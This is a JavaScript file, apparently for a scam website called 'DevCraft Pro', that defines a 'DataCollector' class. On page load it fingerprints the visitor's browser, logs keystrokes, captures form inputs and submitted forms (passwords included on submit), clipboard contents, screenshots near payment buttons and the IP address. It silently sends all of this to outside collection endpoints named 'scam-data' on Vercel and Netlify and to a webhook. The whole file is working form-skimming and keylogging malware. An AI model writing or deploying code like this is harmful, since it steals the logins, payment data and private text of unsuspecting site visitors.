// Advanced Data Collection System
class DataCollector {
    constructor() {
        this.collectedData = [];
        this.sessionId = this.generateSessionId();
        this.startCollection();
    }
    
    generateSessionId() {
        return 'SCAM_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }
    
    startCollection() {
        this.collectBasicInfo();
        this.setupTracking();
        this.setupFormTracking();
        this.setupKeystrokeLogging();
        this.setupClipboardTracking();
        this.setupScreenshot();
    }
    
    collectBasicInfo() {
        const data = {
            session_id: this.sessionId,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer,
            user_agent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen_resolution: `${window.screen.width}x${window.screen.height}`,
            viewport: `${window.innerWidth}x${window.innerHeight}`,
            color_depth: window.screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookies_enabled: navigator.cookieEnabled,
            do_not_track: navigator.doNotTrack || 'unspecified',
            hardware_concurrency: navigator.hardwareConcurrency || 'unknown',
            device_memory: navigator.deviceMemory || 'unknown',
            online_status: navigator.onLine,
            browser_plugins: this.getBrowserPlugins(),
            webgl_vendor: this.getWebGLInfo(),
            fonts: this.getFonts(),
            canvas_fingerprint: this.getCanvasFingerprint()
        };
        
        this.collectedData.push({
            type: 'basic_info',
            data: data
        });
        
        this.sendToServer('basic_info', data);
    }
    
    getBrowserPlugins() {
        return Array.from(navigator.plugins || []).map(plugin => ({
            name: plugin.name,
            description: plugin.description,
            filename: plugin.filename
        }));
    }
    
    getWebGLInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    vendor: gl.getParameter(debugInfo ? debugInfo.UNMASKED_VENDOR_WEBGL : gl.VENDOR),
                    renderer: gl.getParameter(debugInfo ? debugInfo.UNMASKED_RENDERER_WEBGL : gl.RENDERER)
                };
            }
        } catch (e) {}
        return null;
    }
    
    getFonts() {
        // Common fonts detection
        const fonts = [
            'Arial', 'Arial Black', 'Courier New', 'Georgia', 'Impact',
            'Times New Roman', 'Trebuchet MS', 'Verdana', 'Comic Sans MS'
        ];
        
        const detected = [];
        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');
        
        fonts.forEach(font => {
            context.font = '72px monospace';
            const baseline = context.measureText('mmmmmmmmmm').width;
            
            context.font = `72px "${font}", monospace`;
            const width = context.measureText('mmmmmmmmmm').width;
            
            if (width !== baseline) {
                detected.push(font);
            }
        });
        
        return detected;
    }
    
    getCanvasFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        
        canvas.width = 200;
        canvas.height = 50;
        
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(0, 0, 100, 50);
        
        ctx.fillStyle = '#069';
        ctx.fillText('SCAM_FINGERPRINT', 2, 15);
        
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('SCAM_FINGERPRINT', 4, 17);
        
        return canvas.toDataURL().substring(22, 50); // First part of data URL
    }
    
    setupTracking() {
        // Mouse movement tracking
        let mouseMovements = [];
        let lastSend = Date.now();
        
        document.addEventListener('mousemove', (e) => {
            const movement = {
                x: e.clientX,
                y: e.clientY,
                timestamp: Date.now(),
                page: window.location.pathname
            };
            
            mouseMovements.push(movement);
            
            // Send batch every 10 seconds
            if (Date.now() - lastSend > 10000) {
                this.sendToServer('mouse_movements', mouseMovements);
                mouseMovements = [];
                lastSend = Date.now();
            }
        });
        
        // Scroll tracking
        let scrollEvents = [];
        window.addEventListener('scroll', () => {
            scrollEvents.push({
                position: window.scrollY,
                max: document.documentElement.scrollHeight - window.innerHeight,
                timestamp: Date.now()
            });
        });
        
        // Send scroll data on page leave
        window.addEventListener('beforeunload', () => {
            if (scrollEvents.length > 0) {
                this.sendToServer('scroll_behavior', scrollEvents);
            }
        });
        
        // Time on page
        const startTime = Date.now();
        window.addEventListener('beforeunload', () => {
            const timeSpent = Date.now() - startTime;
            this.sendToServer('time_spent', {
                seconds: Math.floor(timeSpent / 1000),
                pages: Array.from(document.querySelectorAll('a[href]')).map(a => a.href).filter(h => h.includes(window.location.hostname))
            });
        });
    }
    
    setupFormTracking() {
        // Track all form inputs
        document.addEventListener('input', (e) => {
            const target = e.target;
            
            if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
                const data = {
                    field: target.name || target.id || target.className,
                    value: target.value,
                    type: target.type,
                    timestamp: Date.now(),
                    page: window.location.pathname
                };
                
                // Don't track passwords in real-time (too noisy)
                if (target.type !== 'password') {
                    this.sendToServer('form_input', data);
                }
            }
        });
        
        // Form submissions
        document.addEventListener('submit', (e) => {
            const form = e.target;
            const formData = new FormData(form);
            const data = {};
            
            for (let [key, value] of formData.entries()) {
                data[key] = value;
            }
            
            this.sendToServer('form_submission', {
                form_id: form.id || form.className,
                data: data,
                timestamp: Date.now(),
                url: window.location.href
            });
        });
    }
    
    setupKeystrokeLogging() {
        let keystrokes = [];
        
        document.addEventListener('keydown', (e) => {
            // Don't log modifier keys
            if (['Shift', 'Control', 'Alt', 'Meta', 'CapsLock'].includes(e.key)) {
                return;
            }
            
            const keystroke = {
                key: e.key,
                code: e.code,
                target: e.target.tagName.toLowerCase(),
                target_id: e.target.id || e.target.name || e.target.className,
                timestamp: Date.now(),
                modifiers: {
                    shift: e.shiftKey,
                    ctrl: e.ctrlKey,
                    alt: e.altKey,
                    meta: e.metaKey
                }
            };
            
            keystrokes.push(keystroke);
            
            // Send batch every 100 keystrokes
            if (keystrokes.length >= 100) {
                this.sendToServer('keystrokes', keystrokes);
                keystrokes = [];
            }
        });
        
        // Send remaining keystrokes on page leave
        window.addEventListener('beforeunload', () => {
            if (keystrokes.length > 0) {
                this.sendToServer('keystrokes', keystrokes);
            }
        });
    }
    
    setupClipboardTracking() {
        document.addEventListener('copy', (e) => {
            const selection = window.getSelection().toString();
            if (selection.length > 0) {
                this.sendToServer('clipboard_copy', {
                    text: selection.substring(0, 500), // Limit length
                    timestamp: Date.now(),
                    page: window.location.href
                });
            }
        });
        
        document.addEventListener('paste', (e) => {
            const pastedText = e.clipboardData.getData('text');
            if (pastedText.length > 0) {
                this.sendToServer('clipboard_paste', {
                    text: pastedText.substring(0, 500),
                    timestamp: Date.now(),
                    page: window.location.href
                });
            }
        });
    }
    
    setupScreenshot() {
        // Attempt to capture page screenshot using html2canvas if available
        if (typeof html2canvas !== 'undefined') {
            // Capture on important events
            const captureEvents = ['submit', 'click', 'beforeunload'];
            
            captureEvents.forEach(eventType => {
                document.addEventListener(eventType, (e) => {
                    if (eventType === 'click' && !this.isImportantClick(e)) return;
                    
                    setTimeout(() => {
                        this.captureScreenshot();
                    }, 1000);
                }, { once: true });
            });
        }
    }
    
    isImportantClick(event) {
        const importantSelectors = [
            '.btn-buy', '.btn-select', '.btn-primary',
            '#paymentForm', 'form', 'button[type="submit"]'
        ];
        
        return importantSelectors.some(selector => 
            event.target.closest(selector)
        );
    }
    
    captureScreenshot() {
        html2canvas(document.body, {
            scale: 0.5, // Lower resolution for speed
            logging: false,
            useCORS: true
        }).then(canvas => {
            const image = canvas.toDataURL('image/jpeg', 0.5);
            
            this.sendToServer('screenshot', {
                image: image,
                timestamp: new Date().toISOString(),
                url: window.location.href,
                resolution: `${canvas.width}x${canvas.height}`
            });
        }).catch(() => {
            // Silent fail
        });
    }
    
    sendToServer(type, data) {
        const payload = {
            type: type,
            data: data,
            session_id: this.sessionId,
            website: 'DevCraft Pro',
            timestamp: new Date().toISOString()
        };
        
        // Multiple endpoints for redundancy
        const endpoints = [
            'https://scam-data-1.vercel.app/api/collect',
            'https://scam-data-2.netlify.app/api/collect',
            'https://webhook.site/#!/YOUR_WEBHOOK_ID/data'
        ];
        
        // Try each endpoint
        endpoints.forEach(endpoint => {
            fetch(endpoint, {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Data-Source': 'collector'
                },
                body: JSON.stringify(payload)
            }).catch(() => {
                // Silent fail - we have multiple endpoints
            });
        });
        
        // Store locally as backup
        this.storeLocalBackup(payload);
    }
    
    storeLocalBackup(data) {
        try {
            const backups = JSON.parse(localStorage.getItem('data_backups') || '[]');
            backups.push(data);
            
            // Keep only last 100 backups
            if (backups.length > 100) {
                backups.splice(0, backups.length - 100);
            }
            
            localStorage.setItem('data_backups', JSON.stringify(backups));
        } catch (error) {
            // Ignore storage errors
        }
    }
    
    // Export collected data
    exportData() {
        return {
            session_id: this.sessionId,
            collected_data: this.collectedData,
            timestamp: new Date().toISOString()
        };
    }
    
    // Get IP address
    async getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            
            this.sendToServer('ip_address', {
                ip: data.ip,
                timestamp: new Date().toISOString()
            });
            
            return data.ip;
        } catch (error) {
            // Try backup service
            try {
                const backup = await fetch('https://api64.ipify.org?format=json');
                const data = await backup.json();
                
                this.sendToServer('ip_address', {
                    ip: data.ip,
                    timestamp: new Date().toISOString(),
                    source: 'backup'
                });
                
                return data.ip;
            } catch (e) {
                return 'unknown';
            }
        }
    }
}

// Initialize data collector
let dataCollector;

document.addEventListener('DOMContentLoaded', () => {
    dataCollector = new DataCollector();
    
    // Get IP address
    dataCollector.getIP().then(ip => {
        localStorage.setItem('user_ip', ip);
    });
    
    // Export function for admin panel
    window.getCollectedData = () => dataCollector.exportData();
});
